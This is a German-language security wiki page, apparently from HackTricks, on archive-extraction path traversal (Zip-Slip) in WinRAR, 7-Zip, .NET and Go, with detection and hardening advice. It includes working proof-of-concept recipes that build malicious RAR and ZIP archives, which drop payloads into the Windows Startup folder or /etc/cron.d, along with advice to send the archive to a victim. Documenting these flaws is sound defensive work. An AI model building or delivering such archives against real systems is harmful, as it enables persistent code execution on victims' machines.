# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Übersicht

Viele Archivformate (ZIP, RAR, TAR, 7-ZIP, etc.) erlauben, dass jeder Eintrag einen eigenen **internen Pfad** trägt. Wenn ein Extraktionsprogramm diesen Pfad blind übernimmt, wird ein manipuliert erscheinender Dateiname, der `..` oder einen **absoluten Pfad** (z. B. `C:\Windows\System32\`) enthält, außerhalb des vom Benutzer gewählten Verzeichnisses geschrieben.
Die Folgen reichen vom Überschreiben beliebiger Dateien bis hin zum direkten Erreichen von **remote code execution (RCE)** durch Ablegen einer Payload in einem **auto-run** Ort wie dem Windows *Startup*-Ordner.
Diese Art von Schwachstelle ist weithin bekannt als *Zip-Slip* oder **archive extraction path traversal**.

## Ursache

1. Ein Angreifer erstellt ein Archiv, in dem ein oder mehrere Datei-Header enthalten:
* Relative Traversal-Sequenzen (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute Pfade (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Oder manipulierte **symlinks**, die außerhalb des Zielverzeichnisses aufgelöst werden (üblich in ZIP/TAR auf *nix*).
2. Das Opfer extrahiert das Archiv mit einem vulnerablen Tool, das dem eingebetteten Pfad vertraut (oder **symlinks** folgt), anstatt ihn zu bereinigen oder die Extraktion unterhalb des gewählten Verzeichnisses zu erzwingen.
3. Die Datei wird an dem vom Angreifer kontrollierten Ort geschrieben und beim nächsten Auslösen dieses Pfads durch das System oder den Benutzer ausgeführt/geladen.

### .NET `Path.Combine` + `ZipArchive` traversal

Ein gängiges .NET Anti-Pattern besteht darin, das beabsichtigte Ziel mit der **vom Benutzer kontrollierten** `ZipArchiveEntry.FullName` zu kombinieren und ohne Pfadnormalisierung zu extrahieren:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Wenn `entry.FullName` mit `..\\` beginnt, kommt es zu einem Traversal; wenn es ein **absoluter Pfad** ist, wird die linke Komponente vollständig verworfen, was als Extraktionsidentität ein **beliebiges Schreiben in eine Datei** ermöglicht.
- Proof-of-concept-Archiv, um in ein benachbartes `app`-Verzeichnis zu schreiben, das von einem geplanten Scanner überwacht wird:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Das Ablegen dieses ZIPs in den überwachten Posteingang führt zu `C:\samples\app\0xdf.txt`, was eine Traversal außerhalb von `C:\samples\queue\` nachweist und nachfolgende Primitiven ermöglicht (z. B. DLL hijacks).

## Real-World Example – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR für Windows (einschließlich der `rar` / `unrar` CLI, der DLL und des portablen Quellcodes) validierte die Dateinamen bei der Extraktion nicht.
Ein bösartiges RAR-Archiv, das einen Eintrag wie den folgenden enthält:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
würde **außerhalb** des ausgewählten Ausgabe-Verzeichnisses und im *Startup*-Ordner des Benutzers landen. Nach der Anmeldung führt Windows automatisch alles dort aus, was vorhanden ist, und ermöglicht so *persistente* RCE.

### Erstellen eines PoC-Archivs (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Verwendete Optionen:
* `-ep`  – store file paths exactly as given (do **not** prune leading `./`).

Übergebe `evil.rar` an das Opfer und weise es an, das Archiv mit einer verwundbaren WinRAR-Version zu entpacken.

### Beobachtete Ausnutzung in freier Wildbahn

ESET meldete, dass RomCom (Storm-0978/UNC2596) spear-phishing-Kampagnen RAR-Archive anhängten, die CVE-2025-8088 ausnutzten, um kundenspezifische Backdoors zu deployen und Ransomware-Operationen zu erleichtern.

## Neuere Fälle (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP-Einträge, die **symbolic links** sind, wurden während der Extraktion aufgelöst, sodass Angreifer das Zielverzeichnis verlassen und beliebige Pfade überschreiben konnten. Die Benutzerinteraktion besteht nur darin, das Archiv *zu öffnen/zu extrahieren*.
* **Betroffen**: 7-Zip 21.02–24.09 (Windows & Linux builds). Gefixt in **25.00** (Juli 2025) und später.
* **Auswirkung**: Überschreibe `Start Menu/Programs/Startup` oder locations, die von Services verwendet werden → Code läuft beim nächsten Login oder Service-Restart.
* **Schnelles PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Auf einem gepatchten Build wird `/etc/cron.d` nicht angetastet; der Symlink wird als Link innerhalb `/tmp/target` extrahiert.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` folgt `../` und symlinked ZIP-Einträgen und schreibt außerhalb von `outputDir`.
* **Betroffen**: `github.com/mholt/archiver` ≤ 3.5.1 (Projekt jetzt deprecated).
* **Fix**: Wechsle zu `mholt/archives` ≥ 0.1.0 oder implementiere Canonical-Path-Checks vor dem Schreiben.
* **Minimales Reproduktionsbeispiel**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Erkennungstipps

* **Statische Inspektion** – Liste die Archiveinträge auf und markiere jeden Namen, der `../`, `..\\`, *absolute paths* (`/`, `C:`) enthält oder Einträge vom Typ *symlink*, deren Ziel außerhalb des Zielverzeichnisses liegt.
* **Kanonisierung** – Stelle sicher, dass `realpath(join(dest, name))` weiterhin mit `dest` beginnt. Andernfalls ablehnen.
* **Extraktion in Sandbox** – Dekomprimiere in ein wegwerfbares Verzeichnis mit einem *sicheren* Extractor (z. B. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) und prüfe, dass die resultierenden Pfade innerhalb des Verzeichnisses bleiben.
* **Endpoint-Überwachung** – Alarmiere bei neuen ausführbaren Dateien, die in `Startup`/`Run`/`cron`-Orte geschrieben werden, kurz nachdem ein Archiv mit WinRAR/7-Zip/etc. geöffnet wurde.

## Minderung & Härtung

1. **Aktualisiere den Extractor** – WinRAR 7.13+ und 7-Zip 25.00+ implementieren Pfad-/Symlink-Bereinigung. Beide Tools haben weiterhin kein Auto-Update.
2. Extrahiere Archive, wenn möglich, mit “**Do not extract paths**” / “**Ignore paths**”.
3. Unter Unix Privilegien reduzieren & ein **chroot/namespace** mounten, bevor extrahiert wird; unter Windows **AppContainer** oder eine Sandbox verwenden.
4. Wenn du eigenen Code schreibst, normalisiere mit `realpath()`/`PathCanonicalize()` **vor** create/write und lehne jeden Eintrag ab, der das Zielverzeichnis verlässt.

## Weitere betroffene / historische Fälle

* 2018 – Massive *Zip-Slip* advisory by Snyk affecting many Java/Go/JS libraries.
* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* Jegliche eigene Extraktionslogik, die es versäumt, `PathCanonicalize` / `realpath` vor dem Schreiben aufzurufen.

## Referenzen

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
